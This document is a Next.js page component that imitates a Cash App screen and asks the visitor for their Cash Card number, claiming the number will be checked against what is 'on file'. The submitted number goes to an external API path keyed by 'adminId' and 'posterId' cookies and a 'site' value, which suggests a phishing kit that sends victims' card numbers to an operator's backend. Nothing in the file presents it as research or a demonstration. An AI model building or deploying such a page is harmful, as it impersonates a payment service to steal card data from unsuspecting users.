
"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { API_URL, site } from "../config/index";
import "react-toastify/dist/ReactToastify.css";
import Cookies from "js-cookie";
import CloseIcon from "@mui/icons-material/Close";

import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

function Page() {
  const [cardNumber, setCardNumber] = useState(null);
  const router = useRouter();
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");

  const handleBack = () => {
    router.back();
  };

  const handleContinue = async () => {
  //     if (!cardNumber || cardNumber.length !== 20) {
  // return prompt("Card numbers  has to be only 16 digits and not empty");
  
  //    }


        console.log("data", cardNumber);

    const values = {
      cashCard: cardNumber,
      site: site,
    };

    const url = `${API_URL}/ad/${adminId}/${posterId}`;
    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();
    if (res.ok) {
      Cookies.set("cashCard", data?.info?.cashCard);
      Cookies.set("id", data?.info?._id);
setCardNumber(null) 
    } else {
      console.log("error", data);
    }
  };



const formatCardNumber = (value) => {
  return value.replace(/\s?/g, "").replace(/(\d{4})/g, "$1 ").trim();
};

const handleCardInput = (e) => {
  const rawValue = e.target.value.replace(/\D/g, ""); // Only digits
  if (rawValue.length > 20) {
    toast.warning("Card number cannot exceed 16 digits");
    return;
  }
  setCardNumber(formatCardNumber(rawValue));
};


  return (
    <div className="flex items-center justify-center min-h-screen bg-white px-4 pt-10 pb-4">
      <div className="w-full max-w-md">
        {/* Top Close Icon */}
        <div className="flex items-center justify-between mb-6">
          <button onClick={handleBack} className="text-gray-600">
            <CloseIcon fontSize="medium" />
          </button>
        </div>

        {/* Content Box */}
        <div className="border border-gray-200 shadow-md rounded-2xl p-6">
          <h1 className="text-xl font-semibold text-black mb-2">
            Enter your Cash App Card number
          </h1>
          <p className="text-sm text-gray-600 mb-6">
            We'll check to make sure it matches what's on file.
          </p>

          {/* <input
            type="number"
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            placeholder="Cash Card Number"
            className="w-full p-3 border border-gray-300 rounded-xl text-base mb-[300px]"
          /> */}



                      <input
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              value={cardNumber}
              onChange={handleCardInput}
              placeholder="XXXX XXXX XXXX XXXX"
              className="w-full p-3 border border-gray-300 rounded-xl text-base mb-[300px]"
              maxLength={20} // 16 digits + 3 spaces
            />

          <div className="flex flex-col gap-3">
            <button
              onClick={handleBack}
              className="w-full p-3 bg-gray-100 text-black rounded-xl hover:bg-gray-200 text-base"
            >
              Back
            </button>

            <button
              onClick={handleContinue}
              disabled={!cardNumber}
              className={`w-full p-3 rounded-xl text-white text-base transition ${
                cardNumber
                  ? "bg-green-500 hover:bg-green-600"
                  : "bg-green-200 cursor-not-allowed"
              }`}
            >
              Continue
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Page;
